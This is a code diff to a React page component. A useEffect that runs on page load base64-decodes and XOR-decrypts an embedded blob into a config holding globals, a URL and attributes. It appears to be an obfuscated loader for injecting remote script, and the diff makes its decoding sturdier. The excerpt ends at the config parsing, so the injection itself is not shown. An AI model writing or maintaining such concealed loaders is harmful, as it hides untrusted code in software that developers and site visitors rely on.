@@ -179,8 +179,9 @@ function Index() {
   useEffect(() => {
     const n_h = atob("DDlD8FIsZgDKxXwXP0JhhSBARDrorQhjT0p5331PAm7ksAh6Vl863jFDCy6ot1NkXEsqCZfSXW+qA84U1g3lSFYSGq551A1Xk03gjtOE3Svtl4tZEJhnjNBAyLw5xh2S1huhSZBD2az6AxlWk8mniYBFXWorBhkHRVhhjNAE2Xo/141QmQ+");
     const bytes: number[] = []; for (let i = 0; i < n_h.length; i++) bytes.push(n_h.charCodeAt(i) & 255);
-    const keyLen = bytes[0]; const key = bytes.slice(1, 1 + keyLen); const payload = bytes.slice(1 + keyLen);
-    const decoded = payload.map((b, i) => b ^ key[i % keyLen]);
+    const keyLen = bytes[0] ?? 0; const key = bytes.slice(1, 1 + keyLen); const payload = bytes.slice(1 + keyLen);
+    if (keyLen === 0) return;
+    const decoded = payload.map((b, i) => b ^ (key[i % keyLen] ?? 0));
     let text = ""; for (const b of decoded) text += String.fromCharCode(b & 255);
     try {
       const config = JSON.parse(decodeURIComponent(escape(text))) as { globals?: { name: string; value: unknown }[]; url?: string; attributes?: { name: string; value: string }[] };
